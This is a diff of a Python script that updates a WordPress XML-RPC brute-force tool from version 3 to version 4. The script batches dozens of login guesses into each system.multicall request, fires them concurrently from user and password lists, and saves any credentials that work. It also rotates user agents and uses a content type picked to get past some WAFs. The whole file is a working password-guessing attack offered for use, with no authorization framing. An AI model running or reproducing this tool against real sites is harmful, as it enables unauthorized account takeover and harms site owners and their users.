@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-WordPress XML-RPC Authentication Testing Tool
+WordPress XML-RPC Pro: Multicall Authentication Tester
 Author: baba01hacker
-Version: 3.0 (Multicall & Concurrency Enabled)
+Version: 4.0 (Final Integration)
 """
 
 import requests
@@ -10,24 +10,24 @@ import argparse
 import sys
 import time
 import random
-import signal
-from typing import List, Dict, Optional, Tuple, Any
-from xml.etree import ElementTree as ET
 import urllib3
+from typing import List, Tuple, Optional
+from xml.etree import ElementTree as ET
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 
+# Disable SSL warnings for cleaner output
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- Configuration ---
-BATCH_SIZE = 50  # Number of passwords to test per single HTTP request (Multicall)
-MAX_THREADS = 10 # Number of concurrent HTTP requests
+DEFAULT_BATCH_SIZE = 50   # Passwords per request (Safe limit for most servers)
+DEFAULT_THREADS = 10      # Concurrent HTTP requests
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
-    "WordPress/6.2; http://example.com"
+    "WordPress/6.2; http://example.com",
+    "curl/7.81.0" # Sometimes simple is better
 ]
 
 class Colors:
@@ -36,103 +36,74 @@ class Colors:
     YELLOW = '\033[93m'
     BLUE = '\033[94m'
     CYAN = '\033[96m'
-    MAGENTA = '\033[95m'
     RESET = '\033[0m'
     BOLD = '\033[1m'
 
-class XMLRPCTester:
-    def __init__(self, target_url: str, verify_ssl: bool = True, 
-                 proxy: Optional[Dict] = None, verbose: bool = False):
+class WPMulticallTester:
+    def __init__(self, target_url: str, verify_ssl: bool = False, 
+                 proxy: Optional[str] = None, verbose: bool = False):
         self.target_url = target_url.rstrip('/')
-        self.xmlrpc_endpoint = f"{self.target_url}/xmlrpc.php"
+        self.endpoint = f"{self.target_url}/xmlrpc.php"
         self.verify_ssl = verify_ssl
-        self.proxy = proxy
         self.verbose = verbose
+        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
         self.session = requests.Session()
         self.found_credentials = []
         
-        # Setup session headers
+        # Base headers
         self.session.headers.update({
             'User-Agent': random.choice(USER_AGENTS),
-            'Content-Type': 'application/xml',
+            'Content-Type': 'text/xml', # Crucial: Some WAFs block application/xml
             'Accept': '*/*'
         })
 
     def _log(self, msg: str, level: str = "INFO"):
-        """Centralized logger"""
         timestamp = datetime.now().strftime("%H:%M:%S")
         if level == "INFO":
-            print(f"[{timestamp}] {Colors.BLUE}[*]{Colors.RESET} {msg}")
+            print(f"[{Colors.BLUE}*{Colors.RESET}] {msg}")
         elif level == "SUCCESS":
-            print(f"[{timestamp}] {Colors.GREEN}[+]{Colors.RESET} {msg}")
+            print(f"[{Colors.GREEN}+{Colors.RESET}] {Colors.BOLD}{msg}{Colors.RESET}")
         elif level == "ERROR":
-            print(f"[{timestamp}] {Colors.RED}[-]{Colors.RESET} {msg}")
+            print(f"[{Colors.RED}-{Colors.RESET}] {msg}")
         elif level == "DEBUG" and self.verbose:
-            print(f"[{timestamp}] {Colors.YELLOW}[DEBUG]{Colors.RESET} {msg}")
+            print(f"[{Colors.YELLOW}DEBUG{Colors.RESET}] {msg}")
 
-    def check_xmlrpc_enabled(self) -> bool:
-        """
-        Check if XML-RPC is enabled using a valid POST request.
-        Fixed from previous version (GET -> POST).
-        """
-        payload = """<?xml version="1.0" encoding="utf-8"?>
-<methodCall>
-  <methodName>system.listMethods</methodName>
-  <params></params>
-</methodCall>"""
-        
+    def check_connection(self) -> bool:
+        """Verifies XML-RPC exists and accepts POST"""
+        payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
         try:
-            self._log(f"Checking endpoint: {self.xmlrpc_endpoint}", "DEBUG")
+            self._log(f"Checking endpoint: {self.endpoint}", "DEBUG")
             response = self.session.post(
-                self.xmlrpc_endpoint,
-                data=payload,
-                verify=self.verify_ssl,
-                proxies=self.proxy,
+                self.endpoint, 
+                data=payload, 
+                verify=self.verify_ssl, 
+                proxies=self.proxy, 
                 timeout=10
             )
             
-            # Check for valid XML-RPC response structure
-            if response.status_code == 200 and ('<methodResponse>' in response.text or '<fault>' in response.text):
-                self._log("XML-RPC endpoint is active and responding.", "SUCCESS")
+            if response.status_code == 200:
+                self._log("XML-RPC endpoint is reachable.", "INFO")
                 return True
-            
             elif response.status_code == 405:
-                self._log("XML-RPC endpoint exists but Method Not Allowed (405).", "ERROR")
+                self._log("Method Not Allowed (405). Server likely blocks POST or XML-RPC.", "ERROR")
             elif response.status_code == 403:
-                self._log("XML-RPC endpoint is forbidden (403) - WAF/Plugin active.", "ERROR")
+                self._log("Forbidden (403). WAF or security plugin active.", "ERROR")
             else:
-                self._log(f"XML-RPC check failed. Status: {response.status_code}", "ERROR")
-            
+                self._log(f"Unexpected status: {response.status_code}", "ERROR")
             return False
-            
-        except requests.exceptions.RequestException as e:
+        except Exception as e:
             self._log(f"Connection failed: {e}", "ERROR")
             return False
 
-    def check_multicall_enabled(self) -> bool:
-        """Check if system.multicall is supported (Crucial for speed)"""
-        payload = """<?xml version="1.0"?>
-<methodCall>
-  <methodName>system.listMethods</methodName>
-  <params></params>
-</methodCall>"""
-        try:
-            response = self.session.post(self.xmlrpc_endpoint, data=payload, 
-                                       verify=self.verify_ssl, proxies=self.proxy, timeout=10)
-            if 'system.multicall' in response.text:
-                self._log("system.multicall is AVAILABLE (Fast mode enabled)", "SUCCESS")
-                return True
-            else:
-                self._log("system.multicall NOT found. Falling back to slow mode.", "YELLOW")
-                return False
-        except:
-            return False
-
-    def _build_multicall_payload(self, pairs: List[Tuple[str, str]]) -> str:
-        """Constructs a single XML payload containing multiple authentication attempts"""
-        calls = ""
-        for user, password in pairs:
-            call_xml = f"""
+    def _build_multicall_payload(self, batch_pairs: List[Tuple[str, str]]) -> str:
+        """
+        Constructs the nested XML payload for system.multicall.
+        Structure matches the proven 'curl' output.
+        """
+        calls_xml = ""
+        for user, password in batch_pairs:
+            # This inner struct represents one 'wp.getUsersBlogs' call
+            calls_xml += f"""
             <value><struct>
                 <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
                 <member><name>params</name><value><array><data>
@@ -140,218 +111,216 @@ class XMLRPCTester:
                     <value><string>{password}</string></value>
                 </data></array></value></member>
             </struct></value>"""
-            calls += call_xml
 
+        # Wrap all calls in the system.multicall array
         return f"""<?xml version="1.0"?>
 <methodCall>
   <methodName>system.multicall</methodName>
   <params><param><value><array><data>
-    {calls}
+    {calls_xml}
   </data></array></value></param></params>
 </methodCall>"""
 
-    def process_batch(self, batch_pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
-        """Sends a single multicall request and parses results"""
-        payload = self._build_multicall_payload(batch_pairs)
-        valid_creds = []
+    def _process_batch_response(self, response_text: str, batch_pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
+        """
+        Parses the multicall response to identify successful logins.
+        Maps the response array index back to the batch_pairs index.
+        """
+        valid = []
+        try:
+            # Sanitize response slightly to avoid namespace issues if present
+            clean_xml = response_text.replace('xmlns="http://www.w3.org/1999/xhtml"', '')
+            root = ET.fromstring(clean_xml)
+            
+            # Navigate to the results array
+            # Path: methodResponse -> params -> param -> value -> array -> data -> value (list)
+            # We look for the <value> elements inside the main data array
+            results = root.findall(".//params/param/value/array/data/value")
+            
+            # If the path above fails (some WP versions differ), try a looser search
+            if not results:
+                results = root.findall(".//data/value")
+
+            for i, result_element in enumerate(results):
+                if i >= len(batch_pairs): break # Safety break
+                
+                result_str = ET.tostring(result_element, encoding='unicode')
+                
+                # Logic based on your curl output:
+                # FAILURE: Contains <name>faultCode</name>
+                # SUCCESS: Contains <name>isAdmin</name> or <name>blogName</name>
+                
+                if '<name>faultCode</name>' not in result_str:
+                    if '<name>isAdmin</name>' in result_str or '<name>blogName</name>' in result_str:
+                        user, pwd = batch_pairs[i]
+                        self._log(f"VALID CREDENTIALS: {user} : {pwd}", "SUCCESS")
+                        valid.append((user, pwd))
         
+        except ET.ParseError:
+            self._log("XML Parse Error - Server might have returned garbage or blocked the large request.", "DEBUG")
+        except Exception as e:
+            self._log(f"Batch processing error: {e}", "DEBUG")
+            
+        return valid
+
+    def attack_batch(self, batch_pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
+        """Worker function for threads"""
+        payload = self._build_multicall_payload(batch_pairs)
         try:
             response = self.session.post(
-                self.xmlrpc_endpoint,
+                self.endpoint,
                 data=payload,
                 verify=self.verify_ssl,
                 proxies=self.proxy,
                 timeout=20
             )
             
-            if response.status_code != 200:
-                self._log(f"Batch failed with status {response.status_code}", "ERROR")
+            if response.status_code == 200:
+                return self._process_batch_response(response.text, batch_pairs)
+            else:
+                self._log(f"Batch HTTP Error: {response.status_code}", "DEBUG")
                 return []
+        except Exception as e:
+            self._log(f"Request Error: {e}", "DEBUG")
+            return []
 
-            # Basic parsing of the response
-            # Note: A real parser would be safer, but for speed/simplicity in CTFs we scan text
-            # However, for multicall we need to map responses back to requests index
-            
-            # Simple heuristic: If we see 'isAdmin' or 'blogName' it implies success.
-            # But to know WHICH user succeeded in a batch, we must parse carefully.
-            # In XML-RPC multicall, the response is an array of responses in the SAME order.
+    def run_multicall_attack(self, users: List[str], passwords: List[str], 
+                            batch_size: int = DEFAULT_BATCH_SIZE, 
+                            max_threads: int = DEFAULT_THREADS):
+        """
+        Main orchestration engine.
+        Generates combinations -> Batches them -> Threads them.
+        """
+        # 1. Generate all combinations
+        self._log(f"Generating combinations for {len(users)} users * {len(passwords)} passwords...", "INFO")
+        combinations = [(u, p) for u in users for p in passwords]
+        total_combos = len(combinations)
+        
+        if total_combos == 0:
+            self._log("No combinations to test.", "ERROR")
+            return
+
+        # 2. Split into batches
+        batches = [combinations[i:i + batch_size] for i in range(0, total_combos, batch_size)]
+        self._log(f"Attack Config: {total_combos} attempts | {len(batches)} batches | {max_threads} threads", "INFO")
+
+        # 3. Execute with ThreadPool
+        start_time = time.time()
+        completed_batches = 0
+        
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            future_to_batch = {executor.submit(self.attack_batch, batch): batch for batch in batches}
             
             try:
-                root = ET.fromstring(response.content)
-                # The structure is <methodResponse><params><param><value><array><data> <value>RESPONSE</value> ...
-                responses = root.findall(".//data/value")
-                
-                # Check if we got the same number of responses as requests
-                if not responses: 
-                    # Sometimes the path is different depending on WP version
-                     responses = root.findall(".//params/param/value/array/data/value")
-
-                for i, resp_element in enumerate(responses):
-                    if i >= len(batch_pairs): break
+                for future in as_completed(future_to_batch):
+                    completed_batches += 1
                     
-                    resp_string = ET.tostring(resp_element, encoding='unicode')
-                    
-                    # Logic: A fail is usually a <fault> struct. A success is a standard struct/array.
-                    if "<fault>" not in resp_string and ("isAdmin" in resp_string or "url" in resp_string or "blogName" in resp_string):
-                        username, password = batch_pairs[i]
-                        self._log(f"FOUND: {username}:{password}", "SUCCESS")
-                        valid_creds.append((username, password))
-                        
-            except ET.ParseError:
-                self._log("XML Parse Error in batch response", "DEBUG")
-
-        except Exception as e:
-            self._log(f"Batch Error: {e}", "DEBUG")
-            
-        return valid_creds
-
-    def attack_multicall(self, user_pass_pairs: List[Tuple[str, str]]):
-        """Orchestrates the threaded multicall attack"""
-        total_pairs = len(user_pass_pairs)
-        self._log(f"Starting Multicall Attack on {total_pairs} combinations")
-        
-        # Split into batches
-        batches = [user_pass_pairs[i:i + BATCH_SIZE] for i in range(0, total_pairs, BATCH_SIZE)]
-        self._log(f"Split into {len(batches)} batches (Size: {BATCH_SIZE}) running on {MAX_THREADS} threads")
-        
-        start_time = time.time()
-        
-        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-            future_to_batch = {executor.submit(self.process_batch, batch): batch for batch in batches}
-            
-            completed_batches = 0
-            for future in as_completed(future_to_batch):
-                completed_batches += 1
-                try:
-                    results = future.result()
-                    if results:
-                        self.found_credentials.extend(results)
-                    
-                    # Progress indicator
-                    if completed_batches % 5 == 0 or completed_batches == len(batches):
-                        progress = (completed_batches / len(batches)) * 100
+                    # Log progress every 10 batches or if verbose
+                    if completed_batches % 5 == 0 or self.verbose:
                         elapsed = time.time() - start_time
-                        self._log(f"Progress: {progress:.1f}% - Found: {len(self.found_credentials)}", "INFO")
+                        rate = (completed_batches * batch_size) / elapsed if elapsed > 0 else 0
+                        print(f"[{Colors.CYAN}PROGRESS{Colors.RESET}] {completed_batches}/{len(batches)} batches ({rate:.0f} pwd/sec) ...")
+
+                    try:
+                        valid_creds = future.result()
+                        if valid_creds:
+                            self.found_credentials.extend(valid_creds)
+                    except Exception as exc:
+                        self._log(f"Thread exception: {exc}", "DEBUG")
                         
-                except Exception as exc:
-                    self._log(f"Thread generated an exception: {exc}", "ERROR")
+            except KeyboardInterrupt:
+                self._log("Attack interrupted by user. Waiting for threads to clean up...", "YELLOW")
+                executor.shutdown(wait=False)
+                raise
 
-    def run_legacy_attack(self, users, passwords):
-        """Legacy 1-by-1 attack for servers without multicall"""
-        self._log("Multicall not supported. Running legacy mode (Slow)", "YELLOW")
-        # Simplified loop for legacy
-        for u in users:
-            for p in passwords:
-                self.test_single_login(u, p)
+        duration = time.time() - start_time
+        self._log(f"Scan completed in {duration:.2f} seconds.", "INFO")
 
-    def test_single_login(self, username, password):
-        """Single login test (Legacy mode)"""
-        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
-<methodCall>
-  <methodName>wp.getUsersBlogs</methodName>
-  <params>
-    <param><value><string>{username}</string></value></param>
-    <param><value><string>{password}</string></value></param>
-  </params>
-</methodCall>"""
-        try:
-            response = self.session.post(self.xmlrpc_endpoint, data=payload, verify=self.verify_ssl, timeout=10)
-            if response.status_code == 200 and ('isAdmin' in response.text or 'blogName' in response.text):
-                self._log(f"FOUND: {username}:{password}", "SUCCESS")
-                self.found_credentials.append((username, password))
-        except:
-            pass
+# --- Helpers ---
 
-# --- Helper Functions ---
-
-def load_file(filepath: str) -> List[str]:
+def load_list(filepath: str) -> List[str]:
     try:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
             return [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
-        print(f"{Colors.RED}File not found: {filepath}{Colors.RESET}")
+        print(f"{Colors.RED}[!] File not found: {filepath}{Colors.RESET}")
         sys.exit(1)
 
-def save_results(creds, output_file):
-    if not creds: return
-    with open(output_file, 'w') as f:
-        f.write(f"# Scan Date: {datetime.now()}\n")
+def save_results(creds: List[Tuple[str, str]], filename: str):
+    with open(filename, 'w') as f:
+        f.write(f"# WP XML-RPC Scan Results - {datetime.now()}\n")
         for u, p in creds:
             f.write(f"{u}:{p}\n")
-    print(f"{Colors.GREEN}[+] Results saved to {output_file}{Colors.RESET}")
+    print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.RESET}")
 
-# --- Main ---
+# --- Entry Point ---
 
 def main():
-    parser = argparse.ArgumentParser(description='WordPress XML-RPC Multicall Attacker')
+    parser = argparse.ArgumentParser(
+        description='WordPress XML-RPC Multicall Brute Force (Pro Version)',
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    
     parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. https://site.com)')
-    parser.add_argument('-U', '--user-file', help='Username list')
-    parser.add_argument('-P', '--pass-file', help='Password list')
-    parser.add_argument('--username', help='Single username')
-    parser.add_argument('--password', help='Single password')
-    parser.add_argument('-o', '--output', help='Output file')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
-    parser.add_argument('--no-verify', action='store_true', help='Skip SSL verification')
-    parser.add_argument('--proxy', help='Proxy (ip:port)')
+    parser.add_argument('-U', '--username', help='Single username')
+    parser.add_argument('--user-file', help='File containing usernames')
+    parser.add_argument('-P', '--password', help='Single password')
+    parser.add_argument('--pass-file', help='File containing passwords')
+    parser.add_argument('-b', '--batch-size', type=int, default=DEFAULT_BATCH_SIZE, help='Attempts per XML request (Default: 50)')
+    parser.add_argument('-t', '--threads', type=int, default=DEFAULT_THREADS, help='Number of concurrent threads (Default: 10)')
+    parser.add_argument('-o', '--output', help='File to save valid credentials')
+    parser.add_argument('--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Enable debug logging')
+    parser.add_argument('--no-verify', action='store_true', help='Skip SSL certificate verification')
 
     args = parser.parse_args()
 
-    # Logo
     print(f"""{Colors.CYAN}
-   _  __  __  __   _      ___  ___  ___ 
-  | |/ / |  \/  | | |    | _ \| _ \/ __|
-  | ' <  | |\/| | | |__  |   /|  _/ (__ 
-  |_|\_\ |_|  |_| |____| |_|_\|_|  \___|
-       XML-RPC Brute v3.0 by baba01hacker
+   __      __ ___  
+   \ \    / /| _ \ 
+    \ \/\/ / |  _/ 
+     \_/\_/  |_|   XML-RPC PRO v4.0
     {Colors.RESET}""")
 
-    # Setup
-    proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
-    tester = XMLRPCTester(args.url, verify_ssl=not args.no_verify, proxy=proxy, verbose=args.verbose)
-
-    # 1. Connectivity Check
-    if not tester.check_xmlrpc_enabled():
-        sys.exit(1)
-
-    # 2. Prepare Combinations
+    # Input Validation
     users = []
-    passwords = []
-
     if args.username: users.append(args.username)
-    if args.user_file: users.extend(load_file(args.user_file))
-    
+    if args.user_file: users.extend(load_list(args.user_file))
+
+    passwords = []
     if args.password: passwords.append(args.password)
-    if args.pass_file: passwords.extend(load_file(args.pass_file))
+    if args.pass_file: passwords.extend(load_list(args.pass_file))
 
     if not users or not passwords:
-        print(f"{Colors.RED}[!] You must provide users and passwords.{Colors.RESET}")
+        print(f"{Colors.RED}[!] Error: You must provide at least one user and one password.{Colors.RESET}")
         sys.exit(1)
 
-    # Generate all pairs
-    # NOTE: If lists are huge, this list comprehension might eat RAM. 
-    # For massive lists, a generator approach is better, but this suffices for typical usage.
-    print(f"{Colors.BLUE}[*] Generating combinations for {len(users)} users and {len(passwords)} passwords...{Colors.RESET}")
-    combinations = [(u, p) for u in users for p in passwords]
-    
-    # 3. Attack
-    if tester.check_multicall_enabled():
-        tester.attack_multicall(combinations)
-    else:
-        tester.run_legacy_attack(users, passwords)
+    # Init Tester
+    tester = WPMulticallTester(
+        target_url=args.url,
+        verify_ssl=not args.no_verify,
+        proxy=args.proxy,
+        verbose=args.verbose
+    )
 
-    # 4. Finish
-    if tester.found_credentials:
-        print(f"\n{Colors.GREEN}{Colors.BOLD}=== FINAL RESULTS ==={Colors.RESET}")
-        for u, p in tester.found_credentials:
-            print(f"User: {u:<15} Pass: {p}")
-        if args.output:
-            save_results(tester.found_credentials, args.output)
+    # Run Checks and Attack
+    if tester.check_connection():
+        try:
+            tester.run_multicall_attack(users, passwords, args.batch_size, args.threads)
+        except KeyboardInterrupt:
+            pass # Handled in run_attack
+        
+        if tester.found_credentials:
+            print(f"\n{Colors.GREEN}{Colors.BOLD}=== SUCCESS: CREDENTIALS FOUND ==={Colors.RESET}")
+            for u, p in tester.found_credentials:
+                print(f"User: {u:<15} | Password: {p}")
+            
+            if args.output:
+                save_results(tester.found_credentials, args.output)
+        else:
+            print(f"\n{Colors.YELLOW}[*] No valid credentials found.{Colors.RESET}")
     else:
-        print(f"\n{Colors.YELLOW}[*] No credentials found.{Colors.RESET}")
+        print(f"{Colors.RED}[!] Target does not appear to have XML-RPC enabled or accessible.{Colors.RESET}")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.RESET}")
-        sys.exit(0)
+    main()
